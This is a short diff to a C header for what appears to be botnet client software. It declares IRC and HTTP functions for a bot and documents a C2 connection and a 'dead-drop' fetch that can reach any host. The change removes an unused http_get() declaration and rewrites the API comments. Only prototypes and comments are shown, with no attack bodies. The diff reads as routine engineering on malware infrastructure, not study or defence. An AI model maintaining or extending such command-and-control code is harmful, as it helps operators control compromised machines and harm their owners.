@@ -327,18 +327,19 @@ void irc_disconnect(notnet_bot_t *bot);
 /* ── HTTP Functions ─────────────────────────────────────────── */
 int http_connect(notnet_bot_t *bot);
 int http_post(notnet_bot_t *bot, const char *data, int len);
-/* API CONTRACT (#60): http_get() and http_read() return the FULL HTTP
- * response — status line, headers, and body — into buf, and return the
- * total number of bytes received (or -1 on error, 0 when nothing was
- * readable). They do NOT strip headers. Callers that need only the body
- * must locate the "\r\n\r\n" header terminator themselves (as
- * protocol_process_commands and http_download already do). */
-int http_get(notnet_bot_t *bot, char *buf, int len);
+/* API CONTRACT (#60): http_read() returns the FULL HTTP response —
+ * status line, headers, and body — into buf, and return the total number
+ * of bytes received (or -1 on error, 0 when nothing was readable). It does
+ * NOT strip headers. Callers that need only the body must locate the
+ * "\r\n\r\n" header terminator themselves (as protocol_process_commands
+ * and http_download already do). The dead http_get() was removed in the
+ * #112 dead-code sweep; http_get_url() below is the live arbitrary-URL
+ * fetch. */
 /* Dead-drop / arbitrary-URL fetch (#86): GET a plaintext http:// URL into
  * buf (bounded to len bytes total incl. headers) with a 10s timeout, and
  * return the total bytes received (full response — status, headers, body;
- * caller strips the "\r\n\r\n" terminator). Unlike http_get() this does not
- * require an existing C2 connection and can target any host. Cleartext only
+ * caller strips the "\r\n\r\n" terminator). This does NOT require an
+ * existing C2 connection and can target any host. Cleartext only
  * (the default build has no TLS); callers must NOT treat the transport as a
  * trust boundary. Returns -1 on failure, non-2xx, or empty body. */
 int http_get_url(notnet_bot_t *bot, const char *url, char *buf, int len);
